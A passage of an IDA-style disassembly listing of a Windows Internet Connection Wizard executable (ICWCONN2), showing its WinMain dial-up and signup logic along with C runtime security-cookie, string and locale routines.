		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?DeleteIRN@@YAJXZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

; int __stdcall	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
_WinMain@16	proc near		; CODE XREF: _WinMainCRTStartup+185p

var_8		= dword	ptr -8
hKey		= dword	ptr -4
hInstance	= dword	ptr  8
hPrevInstance	= dword	ptr  0Ch
lpText		= dword	ptr  10h
nShowCmd	= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		xor	esi, esi
		push	offset byte_1001DFC ; char *
		push	esi		; int
		mov	[ebp+hKey], esi
		mov	[ebp+var_8], esi
		call	_setlocale
		pop	ecx
		pop	ecx
		push	41h
		pop	ecx
		xor	eax, eax
		mov	ebx, offset ?pszINSFileName@@3PAGA ; ushort * pszINSFileName
		mov	edi, ebx
		rep stosd
		stosb
		push	41h
		pop	ecx
		xor	eax, eax
		mov	edi, offset ?pszFinalConnectoid@@3PAGA ; ushort	* pszFinalConnectoid
		rep stosd
		stosb
		xor	eax, eax
		mov	ecx, 100h
		mov	edi, offset ?pszSetupClientURL@@3PAGA ;	ushort * pszSetupClientURL
		rep stosd
		push	offset Name	; "Internet Connection Wizard Non ICWCONN1"...
		xor	edi, edi
		inc	edi
		push	edi		; lMaximumCount
		push	edi		; lInitialCount
		push	esi		; lpSemaphoreAttributes
		call	ds:__imp__CreateSemaphoreW@16 ;	CreateSemaphoreW(x,x,x,x)
		mov	?hrasconn@@3PAUHRASCONN__@@A, esi ; HRASCONN__ * hrasconn
		mov	?uiSetupClientNewPhoneCall@@3IA, esi ; uint uiSetupClientNewPhoneCall
		mov	?fUserCanceled@@3HA, esi ; int fUserCanceled
		mov	?dwDownLoad@@3KA, esi ;	ulong dwDownLoad
		mov	?g_bProgressBarVisible@@3HA, esi ; int g_bProgressBarVisible
		call	?DeleteIRN@@YAJXZ ; DeleteIRN(void)
		call	ds:__imp__GetCommandLineW@0 ; GetCommandLineW()
		push	eax		; Str
		call	?ParseCommandLine@@YAJPAG@Z ; ParseCommandLine(ushort *)
		test	eax, eax
		pop	ecx
		jz	short loc_1006090
		push	[ebp+lpText]
		push	offset aIcwconn2Malfor ; "ICWCONN2: Malformed cmd line '%s'\n"
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		pop	ecx
		push	10h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1FEh		; unsigned __int16

loc_100607D:				; CODE XREF: WinMain(x,x,x,x)+1FCj
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	esi		; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		jmp	loc_10061F5
; ---------------------------------------------------------------------------

loc_1006090:				; CODE XREF: WinMain(x,x,x,x)+8Cj
		push	ebx		; lpFileName
		mov	?g_bINSFileExists@@3HA,	edi ; int g_bINSFileExists
		call	?FileExists@@YAHPAG@Z ;	FileExists(ushort *)
		test	eax, eax
		pop	ecx
		jnz	loc_1006133
		push	1FDh		; unsigned __int16
		mov	?g_bINSFileExists@@3HA,	esi ; int g_bINSFileExists
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		cmp	eax, esi
		pop	ecx
		mov	[ebp+hInstance], eax
		jz	loc_10061F5
		push	eax		; lpString
		call	ds:__imp__lstrlenW@4 ; lstrlenW(x)
		add	eax, 107h
		push	eax		; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		mov	edi, eax
		cmp	edi, esi
		mov	[ebp+lpText], edi
		jz	loc_10061B6
		push	[ebp+hInstance]	; LPCWSTR
		push	edi		; LPWSTR
		call	ds:__imp__wsprintfW
		pop	ecx
		pop	ecx
		push	offset asc_1001D48 ; "\""
		push	edi		; lpString1
		mov	edi, ds:__imp__lstrcatW@8 ; lstrcatW(x,x)
		call	edi ; lstrcatW(x,x) ; lstrcatW(x,x)
		push	ebx		; lpString2
		push	[ebp+lpText]	; lpString1
		call	edi ; lstrcatW(x,x) ; lstrcatW(x,x)
		push	offset asc_1001D48 ; "\""
		push	[ebp+lpText]	; lpString1
		call	edi ; lstrcatW(x,x) ; lstrcatW(x,x)
		push	10h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	[ebp+lpText]	; lpText
		push	esi		; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		push	[ebp+lpText]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		jmp	loc_10061F5
; ---------------------------------------------------------------------------

loc_1006133:				; CODE XREF: WinMain(x,x,x,x)+D2j
		call	?FindCurrentConn@@YAJXZ	; FindCurrentConn(void)
		test	eax, eax
		jnz	loc_10061F5
		push	ebx		; lpFileName
		push	400h		; nSize
		push	offset ?pszSetupClientURL@@3PAGA ; lpReturnedString
		push	offset Default	; lpDefault
		push	offset aClient_setup_u ; "Client_Setup_Url"
		mov	edi, offset AppName ; "ClientSetup"
		push	edi		; lpAppName
		call	ds:__imp__GetPrivateProfileStringW@24 ;	GetPrivateProfileStringW(x,x,x,x,x,x)
		push	ebx		; lpFileName
		push	esi		; nDefault
		push	offset aClient_setup_n ; "Client_Setup_New_Call"
		push	edi		; lpAppName
		call	ds:__imp__GetPrivateProfileIntW@16 ; GetPrivateProfileIntW(x,x,x,x)
		cmp	eax, 1
		mov	?uiSetupClientNewPhoneCall@@3IA, eax ; uint uiSetupClientNewPhoneCall
		jnz	short loc_10061E6
		mov	eax, ?hrasconn@@3PAUHRASCONN__@@A ; HRASCONN__ * hrasconn
		cmp	eax, esi
		jz	short loc_10061E6
		push	eax		; HRASCONN
		call	_RasHangUpW@4	; RasHangUpW(x)
		push	?hrasconn@@3PAUHRASCONN__@@A ; HRASCONN
		call	?WaitForConnectionTermination@@YAHPAUHRASCONN__@@@Z ; WaitForConnectionTermination(HRASCONN__ *)
		push	40h		; dwBytes
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, esi
		pop	ecx
		pop	ecx
		jz	short loc_10061AC
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+var_8], eax
		jmp	short loc_10061AF
; ---------------------------------------------------------------------------

loc_10061AC:				; CODE XREF: WinMain(x,x,x,x)+1D1j
		mov	[ebp+var_8], esi

loc_10061AF:				; CODE XREF: WinMain(x,x,x,x)+1DDj
		mov	ecx, [ebp+var_8]
		cmp	ecx, esi
		jnz	short loc_10061CE

loc_10061B6:				; CODE XREF: WinMain(x,x,x,x)+110j
		push	10h
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax
		push	1F7h
		jmp	loc_100607D
; ---------------------------------------------------------------------------

loc_10061CE:				; CODE XREF: WinMain(x,x,x,x)+1E7j
		push	offset ?pszFinalConnectoid@@3PAGA ; ushort * pszFinalConnectoid
		push	esi
		call	?RasDeleteEntryW@RNAAPI@@QAEKPAG0@Z ; RNAAPI::RasDeleteEntryW(ushort *,ushort *)
		mov	?pszFinalConnectoid@@3PAGA, si ; ushort	* pszFinalConnectoid
		mov	?hrasconn@@3PAUHRASCONN__@@A, esi ; HRASCONN__ * hrasconn

loc_10061E6:				; CODE XREF: WinMain(x,x,x,x)+1AAj
					; WinMain(x,x,x,x)+1B3j
		push	[ebp+hInstance]	; struct HINSTANCE__ *
		push	offset ?pszSetupClientURL@@3PAGA ; unsigned __int16 *
		call	?CallDownLoad@@YAJPAGPAUHINSTANCE__@@@Z	; CallDownLoad(ushort *,HINSTANCE__ *)
		pop	ecx
		pop	ecx

loc_10061F5:				; CODE XREF: WinMain(x,x,x,x)+BEj
					; WinMain(x,x,x,x)+EEj	...
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	offset aSoftwareMicros ; "SOFTWARE\\MICROSOFT\\ISIGNUP"
		push	80000002h	; hKey
		mov	[ebp+hKey], esi
		call	ds:__imp__RegOpenKeyW@12 ; RegOpenKeyW(x,x,x)
		test	eax, eax
		jnz	short loc_1006227
		push	offset ValueName ; "UserInfo"
		push	[ebp+hKey]	; hKey
		call	ds:__imp__RegDeleteValueW@8 ; RegDeleteValueW(x,x)
		push	[ebp+hKey]	; hKey
		call	ds:__imp__RegCloseKey@4	; RegCloseKey(x)

loc_1006227:				; CODE XREF: WinMain(x,x,x,x)+241j
		cmp	?g_bINSFileExists@@3HA,	esi ; int g_bINSFileExists
		jz	short loc_100623F
		cmp	?pszINSFileName@@3PAGA,	si ; ushort * pszINSFileName
		jz	short loc_100623F
		push	ebx		; lpString
		call	?DeleteFileKindaLikeThisOne@@YAJPAG@Z ;	DeleteFileKindaLikeThisOne(ushort *)
		pop	ecx

loc_100623F:				; CODE XREF: WinMain(x,x,x,x)+260j
					; WinMain(x,x,x,x)+269j
		push	offset aConnect2Quitti ; "CONNECT2:Quitting WinMain.\n"
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		mov	eax, ?hrasconn@@3PAUHRASCONN__@@A ; HRASCONN__ * hrasconn
		cmp	eax, esi
		pop	ecx
		jz	short loc_10062B5
		push	eax		; HRASCONN
		call	_RasHangUpW@4	; RasHangUpW(x)
		cmp	?pszFinalConnectoid@@3PAGA, si ; ushort	* pszFinalConnectoid
		jz	short loc_100629C
		cmp	[ebp+var_8], esi
		jnz	short loc_100629C
		push	40h		; dwBytes
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, esi
		pop	ecx
		jz	short loc_100627C
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		jmp	short loc_100627E
; ---------------------------------------------------------------------------

loc_100627C:				; CODE XREF: WinMain(x,x,x,x)+2A4j
		xor	eax, eax

loc_100627E:				; CODE XREF: WinMain(x,x,x,x)+2ADj
		cmp	eax, esi
		jnz	short loc_100628F
		push	offset aIcwconn2Coul_0 ; "ICWCONN2: couldn't allocate pRnaapi mem"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		jmp	short loc_100629C
; ---------------------------------------------------------------------------

loc_100628F:				; CODE XREF: WinMain(x,x,x,x)+2B3j
		push	offset ?pszFinalConnectoid@@3PAGA ; ushort * pszFinalConnectoid
		push	esi
		mov	ecx, eax
		call	?RasDeleteEntryW@RNAAPI@@QAEKPAG0@Z ; RNAAPI::RasDeleteEntryW(ushort *,ushort *)

loc_100629C:				; CODE XREF: WinMain(x,x,x,x)+293j
					; WinMain(x,x,x,x)+298j ...
		push	?hrasconn@@3PAUHRASCONN__@@A ; HRASCONN
		mov	?pszFinalConnectoid@@3PAGA, si ; ushort	* pszFinalConnectoid
		call	?WaitForConnectionTermination@@YAHPAUHRASCONN__@@@Z ; WaitForConnectionTermination(HRASCONN__ *)
		pop	ecx
		mov	?hrasconn@@3PAUHRASCONN__@@A, esi ; HRASCONN__ * hrasconn

loc_10062B5:				; CODE XREF: WinMain(x,x,x,x)+284j
		mov	eax, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		cmp	eax, esi
		jz	short loc_10062C5
		push	eax		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_10062C5:				; CODE XREF: WinMain(x,x,x,x)+2EFj
		push	esi		; uExitCode
		call	ds:__imp__ExitProcess@4	; ExitProcess(x)
_WinMain@16	endp

; ---------------------------------------------------------------------------
		db 6 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___security_init_cookie	proc near	; DATA XREF: .data:0100E004o

PerformanceCount= LARGE_INTEGER	ptr -10h
SystemTimeAsFileTime= _FILETIME	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	eax, ___security_cookie
		test	eax, eax
		jz	short loc_10062EA
		cmp	eax, 0BB40h
		jnz	short loc_1006337

loc_10062EA:				; CODE XREF: ___security_init_cookie+Fj
		push	esi
		lea	eax, [ebp+SystemTimeAsFileTime]
		push	eax		; lpSystemTimeAsFileTime
		call	ds:__imp__GetSystemTimeAsFileTime@4 ; GetSystemTimeAsFileTime(x)
		mov	esi, [ebp+SystemTimeAsFileTime.dwHighDateTime]
		xor	esi, [ebp+SystemTimeAsFileTime.dwLowDateTime]
		call	ds:__imp__GetCurrentProcessId@0	; GetCurrentProcessId()
		xor	esi, eax
		call	ds:__imp__GetCurrentThreadId@0 ; GetCurrentThreadId()
		xor	esi, eax
		call	ds:__imp__GetTickCount@0 ; GetTickCount()
		xor	esi, eax
		lea	eax, [ebp+PerformanceCount]
		push	eax		; lpPerformanceCount
		call	ds:__imp__QueryPerformanceCounter@4 ; QueryPerformanceCounter(x)
		mov	eax, dword ptr [ebp+PerformanceCount+4]
		xor	eax, dword ptr [ebp+PerformanceCount]
		xor	eax, esi
		and	eax, 0FFFFh
		pop	esi
		jnz	short loc_1006332
		mov	eax, 0BB40h

loc_1006332:				; CODE XREF: ___security_init_cookie+59j
		mov	___security_cookie, eax

loc_1006337:				; CODE XREF: ___security_init_cookie+16j
		not	eax
		mov	___security_cookie_complement, eax
		leave
		retn
___security_init_cookie	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; __fastcall __security_check_cookie(x)
@__security_check_cookie@4 proc	near	; CODE XREF: IsNT(void)+48p
					; DialErrDlgProc(x,x,x,x)+7A9p	...
		cmp	ecx, ___security_cookie
		jnz	short loc_1006356
		test	ecx, 0FFFF0000h
		jnz	short loc_1006356
		retn
; ---------------------------------------------------------------------------

loc_1006356:				; CODE XREF: __security_check_cookie(x)+6j
					; __security_check_cookie(x)+Ej
		jmp	___report_gsfailure
@__security_check_cookie@4 endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___report_gsfailure proc near		; CODE XREF: __security_check_cookie(x):loc_1006356j

var_330		= dword	ptr -330h
var_324		= dword	ptr -324h
var_2E0		= dword	ptr -2E0h
var_2DC		= dword	ptr -2DCh
var_2D8		= dword	ptr -2D8h
var_24C		= word ptr -24Ch
var_248		= word ptr -248h
var_244		= word ptr -244h
var_240		= word ptr -240h
var_23C		= dword	ptr -23Ch
var_238		= dword	ptr -238h
var_234		= dword	ptr -234h
var_230		= dword	ptr -230h
var_22C		= dword	ptr -22Ch
var_228		= dword	ptr -228h
var_224		= dword	ptr -224h
var_220		= dword	ptr -220h
var_21C		= word ptr -21Ch
var_218		= dword	ptr -218h
var_214		= dword	ptr -214h
var_210		= word ptr -210h
ExceptionInfo	= _EXCEPTION_POINTERS ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 330h
		push	edi
		mov	[ebp+var_228], eax
		mov	[ebp+var_22C], ecx
		mov	[ebp+var_230], edx
		mov	[ebp+var_234], ebx
		mov	[ebp+var_238], esi
		mov	[ebp+var_23C], edi
		mov	[ebp+var_210], ss
		mov	[ebp+var_21C], cs
		mov	[ebp+var_240], ds
		mov	[ebp+var_244], es
		mov	[ebp+var_248], fs
		mov	[ebp+var_24C], gs
		pushf
		pop	[ebp+var_218]
		mov	[ebp+var_2D8], 10001h
		mov	eax, [ebp+4]
		mov	[ebp+var_220], eax
		lea	eax, [ebp+4]
		mov	[ebp+var_214], eax
		lea	eax, [ebp+4]
		mov	eax, [eax-4]
		mov	[ebp+var_224], eax
		push	14h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_330]
		rep stosd
		mov	[ebp+var_330], 0C0000409h
		mov	eax, [ebp+4]
		mov	[ebp+var_324], eax
		lea	eax, [ebp+var_330]
		mov	[ebp+ExceptionInfo.ExceptionRecord], eax
		lea	eax, [ebp+var_2D8]
		mov	[ebp+ExceptionInfo.ContextRecord], eax
		mov	eax, ___security_cookie
		mov	[ebp+var_2E0], eax
		mov	eax, ___security_cookie_complement
		mov	[ebp+var_2DC], eax
		push	0		; lpTopLevelExceptionFilter
		call	ds:__imp__SetUnhandledExceptionFilter@4	; SetUnhandledExceptionFilter(x)
		lea	eax, [ebp+ExceptionInfo]
		push	eax		; ExceptionInfo
		call	ds:__imp__UnhandledExceptionFilter@4 ; UnhandledExceptionFilter(x)
		push	502h		; uExitCode
		call	ds:__imp__GetCurrentProcess@0 ;	GetCurrentProcess()
		push	eax		; hProcess
		call	ds:__imp__TerminateProcess@8 ; TerminateProcess(x,x)
		pop	edi
		leave
		retn
___report_gsfailure endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

__amsg_exit	proc near		; CODE XREF: _WinMainCRTStartup+105p
					; _WinMainCRTStartup+12Bp ...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	___error_mode, 1
		jnz	short loc_1006470
		call	__FF_MSGBANNER

loc_1006470:				; CODE XREF: __amsg_exit+Cj
		push	[ebp+arg_0]
		call	__NMSG_WRITE
		push	0FFh		; Code
		call	__aexit_rtn
__amsg_exit	endp

; ---------------------------------------------------------------------------
		pop	ecx
		pop	ecx
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
		assume fs:nothing, gs:nothing
; [0000018A BYTES: COLLAPSED FUNCTION _WinMainCRTStartup. PRESS	KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	esi, eax
		mov	[ebp-2Ch], esi
		cmp	dword ptr [ebp-1Ch], 0
		jnz	short loc_1006627
		push	esi
		call	_exit
; ---------------------------------------------------------------------------

loc_1006627:				; CODE XREF: .text:0100661Fj
		call	__cexit
		jmp	short loc_1006659
; ---------------------------------------------------------------------------
; [0000003A BYTES: COLLAPSED CHUNK OF FUNCTION _WinMainCRTStartup. PRESS KEYPAD	"+" TO EXPAND]
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void __cdecl operator	delete(void *)
??3@YAXPAX@Z	proc near		; CODE XREF: RNAAPI::`scalar deleting destructor'(uint)+14p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		pop	ebp
		jmp	_free
??3@YAXPAX@Z	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl operator new(SIZE_T dwBytes)
??2@YAPAXI@Z	proc near		; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+16p
					; FillModems(void)+89p	...

dwBytes		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	1		; int
		push	[ebp+dwBytes]	; dwBytes
		call	__nh_malloc
		pop	ecx
		pop	ecx
		pop	ebp
		retn
??2@YAPAXI@Z	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl toupper(int C)
_toupper	proc near		; CODE XREF: fStrNCmpI(ushort *,ushort *,uint)+20p
					; fStrNCmpI(ushort *,ushort *,uint)+2Bp

DestStr		= word ptr -8
MultiByteStr	= byte ptr -4
var_3		= byte ptr -3
var_2		= byte ptr -2
C		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		cmp	dword_10106FC, 0
		push	ebx
		mov	ebx, [ebp+C]
		jz	loc_100675C
		cmp	___lc_clike, 0
		jz	short loc_10066BF
		cmp	ebx, 7Fh
		jbe	loc_100675C

loc_10066BF:				; CODE XREF: _toupper+1Fj
		cmp	ebx, 100h
		jnb	short loc_10066EC
		cmp	___mb_cur_max, 1
		jle	short loc_10066DC
		push	2		; Type
		push	ebx		; C
		call	__isctype
		pop	ecx
		pop	ecx
		jmp	short loc_10066E8
; ---------------------------------------------------------------------------

loc_10066DC:				; CODE XREF: _toupper+39j
		mov	eax, __pctype
		movzx	eax, byte ptr [eax+ebx*2]
		and	eax, 2

loc_10066E8:				; CODE XREF: _toupper+45j
		test	eax, eax
		jz	short loc_1006769

loc_10066EC:				; CODE XREF: _toupper+30j
		mov	edx, __pctype
		mov	eax, ebx
		sar	eax, 8
		movzx	ecx, al
		test	byte ptr [edx+ecx*2+1],	80h
		jz	short loc_1006710
		push	2
		mov	[ebp+MultiByteStr], al
		mov	[ebp+var_3], bl
		mov	[ebp+var_2], 0
		pop	eax
		jmp	short loc_100671A
; ---------------------------------------------------------------------------

loc_1006710:				; CODE XREF: _toupper+6Aj
		xor	eax, eax
		mov	[ebp+MultiByteStr], bl
		mov	[ebp+var_3], 0
		inc	eax

loc_100671A:				; CODE XREF: _toupper+79j
		push	1		; int
		push	___lc_codepage	; CodePage
		lea	ecx, [ebp+DestStr]
		push	3		; cchDest
		push	ecx		; lpDestStr
		push	eax		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	200h		; dwMapFlags
		push	dword_10106FC	; Locale
		call	___crtLCMapStringA
		add	esp, 20h
		test	eax, eax
		jz	short loc_1006769
		cmp	eax, 1
		jnz	short loc_100674F
		movzx	eax, byte ptr [ebp+DestStr]
		jmp	short loc_100676B
; ---------------------------------------------------------------------------

loc_100674F:				; CODE XREF: _toupper+B2j
		movzx	ecx, byte ptr [ebp+DestStr+1]
		xor	eax, eax
		mov	ah, byte ptr [ebp+DestStr]
		or	eax, ecx
		jmp	short loc_100676B
; ---------------------------------------------------------------------------

loc_100675C:				; CODE XREF: _toupper+12j _toupper+24j
		cmp	ebx, 61h
		jl	short loc_1006769
		cmp	ebx, 7Ah
		lea	eax, [ebx-20h]
		jle	short loc_100676B

loc_1006769:				; CODE XREF: _toupper+55j _toupper+ADj ...
		mov	eax, ebx

loc_100676B:				; CODE XREF: _toupper+B8j _toupper+C5j ...
		pop	ebx
		leave
		retn
_toupper	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; wchar_t *__cdecl wcsstr(const	wchar_t	*Str, const wchar_t *SubStr)
_wcsstr		proc near		; CODE XREF: CopyCmdLineData(ushort *,ushort *,ushort *)+Fp
					; ParseCommandLine(ushort *)+16p

Str		= dword	ptr  8
SubStr		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+SubStr]
		cmp	word ptr [ecx],	0
		mov	eax, [ebp+Str]
		push	edi
		mov	edi, eax
		jz	short loc_10067CD
		xor	edx, edx
		mov	dx, [eax]
		test	dx, dx
		push	ebx
		jz	short loc_10067CA
		sub	eax, ecx

loc_1006794:				; CODE XREF: _wcsstr+55j
		test	dx, dx
		mov	ecx, [ebp+SubStr]
		jz	short loc_10067B8

loc_100679C:				; CODE XREF: _wcsstr+43j
		mov	dx, [ecx]
		test	dx, dx
		jz	short loc_10067D0
		movzx	ebx, word ptr [eax+ecx]
		movzx	edx, dx
		sub	ebx, edx
		jnz	short loc_10067B8
		inc	ecx
		inc	ecx
		cmp	word ptr [eax+ecx], 0
		jnz	short loc_100679C

loc_10067B8:				; CODE XREF: _wcsstr+27j _wcsstr+3Aj
		cmp	word ptr [ecx],	0
		jz	short loc_10067D0
		inc	edi
		inc	edi
		mov	dx, [edi]
		inc	eax
		inc	eax
		test	dx, dx
		jnz	short loc_1006794

loc_10067CA:				; CODE XREF: _wcsstr+1Dj
		xor	eax, eax

loc_10067CC:				; CODE XREF: _wcsstr+5Fj
		pop	ebx

loc_10067CD:				; CODE XREF: _wcsstr+12j
		pop	edi
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_10067D0:				; CODE XREF: _wcsstr+2Fj _wcsstr+49j
		mov	eax, edi
		jmp	short loc_10067CC
_wcsstr		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__strcats	proc near		; CODE XREF: ___lc_lctostr+2Cp
					; ___lc_lctostr+4Bp ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, [ebp+arg_4]
		test	eax, eax
		jle	short locret_1006823
		push	ebx
		push	esi
		push	edi
		lea	ebx, [ebp+arg_4]
		mov	[ebp+var_4], eax

loc_10067EF:				; CODE XREF: __strcats+45j
		add	ebx, 4
		mov	eax, [ebx]
		mov	edx, eax

loc_10067F6:				; CODE XREF: __strcats+22j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_10067F6
		mov	edi, [ebp+arg_0]
		sub	eax, edx
		dec	edi

loc_1006803:				; CODE XREF: __strcats+30j
		mov	cl, [edi+1]
		inc	edi
		test	cl, cl
		jnz	short loc_1006803
		mov	ecx, eax
		shr	ecx, 2
		mov	esi, edx
		rep movsd
		mov	ecx, eax
		and	ecx, 3
		dec	[ebp+var_4]
		rep movsb
		jnz	short loc_10067EF
		pop	edi
		pop	esi
		pop	ebx

locret_1006823:				; CODE XREF: __strcats+Bj
		leave
		retn
__strcats	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __lc_strtolc(int,	char *Str)
___lc_strtolc	proc near		; CODE XREF: __expandlocale+E3p

arg_0		= dword	ptr  8
Str		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_0]
		push	esi
		mov	esi, [ebp+Str]
		push	edi
		push	24h
		xor	eax, eax
		pop	ecx
		mov	edi, edx
		rep stosd
		mov	al, [esi]
		test	al, al
		jz	short loc_1006864
		cmp	al, 2Eh
		jnz	short loc_100686B
		lea	eax, [esi+1]
		cmp	byte ptr [eax],	0
		jz	short loc_100686B
		add	edx, 80h
		sub	edx, eax

loc_100685A:				; CODE XREF: ___lc_strtolc+38j
		mov	cl, [eax]
		mov	[edx+eax], cl
		inc	eax
		test	cl, cl
		jnz	short loc_100685A

loc_1006864:				; CODE XREF: ___lc_strtolc+1Aj
		xor	eax, eax
		jmp	loc_10068F2
; ---------------------------------------------------------------------------

loc_100686B:				; CODE XREF: ___lc_strtolc+1Ej
					; ___lc_strtolc+26j
		and	[ebp+Str], 0
		push	ebx
		jmp	short loc_10068DD
; ---------------------------------------------------------------------------

loc_1006872:				; CODE XREF: ___lc_strtolc+C2j
		cmp	[ebp+Str], 0
		lea	edi, [eax+esi]
		mov	bl, [edi]
		jnz	short loc_100688E
		cmp	eax, 40h
		jnb	short loc_10068EE
		cmp	bl, 2Eh
		jz	short loc_10068EE
		push	eax
		push	esi
		push	[ebp+arg_0]
		jmp	short loc_10068C6
; ---------------------------------------------------------------------------

loc_100688E:				; CODE XREF: ___lc_strtolc+51j
		cmp	[ebp+Str], 1
		jnz	short loc_10068A7
		cmp	eax, 40h
		jnb	short loc_10068EE
		cmp	bl, 5Fh
		jz	short loc_10068EE
		push	eax
		mov	eax, [ebp+arg_0]
		add	eax, 40h
		jmp	short loc_10068C4
; ---------------------------------------------------------------------------

loc_10068A7:				; CODE XREF: ___lc_strtolc+68j
		cmp	[ebp+Str], 2
		jnz	short loc_10068EE
		cmp	eax, 10h
		jnb	short loc_10068EE
		test	bl, bl
		jz	short loc_10068BB
		cmp	bl, 2Ch
		jnz	short loc_10068EE

loc_10068BB:				; CODE XREF: ___lc_strtolc+8Aj
		push	eax		; Count
		mov	eax, [ebp+arg_0]
		add	eax, 80h

loc_10068C4:				; CODE XREF: ___lc_strtolc+7Bj
		push	esi		; Source
		push	eax		; Dest

loc_10068C6:				; CODE XREF: ___lc_strtolc+62j
		call	_strncpy
		add	esp, 0Ch
		cmp	bl, 2Ch
		jz	short loc_10068F6
		test	bl, bl
		jz	short loc_10068F6
		inc	[ebp+Str]
		lea	esi, [edi+1]

loc_10068DD:				; CODE XREF: ___lc_strtolc+46j
		push	offset Control	; "_.,"
		push	esi		; Str
		call	_strcspn
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1006872

loc_10068EE:				; CODE XREF: ___lc_strtolc+56j
					; ___lc_strtolc+5Bj ...
		or	eax, 0FFFFFFFFh

loc_10068F1:				; CODE XREF: ___lc_strtolc+CEj
		pop	ebx

loc_10068F2:				; CODE XREF: ___lc_strtolc+3Cj
		pop	edi
		pop	esi
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_10068F6:				; CODE XREF: ___lc_strtolc+A7j
					; ___lc_strtolc+ABj
		xor	eax, eax
		jmp	short loc_10068F1
___lc_strtolc	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___lc_lctostr	proc near		; CODE XREF: __expandlocale+126p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_0]
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, esi
		sub	edx, esi

loc_100690F:				; CODE XREF: ___lc_lctostr+18j
		mov	cl, [eax]
		mov	[edx+eax], cl
		inc	eax
		test	cl, cl
		jnz	short loc_100690F
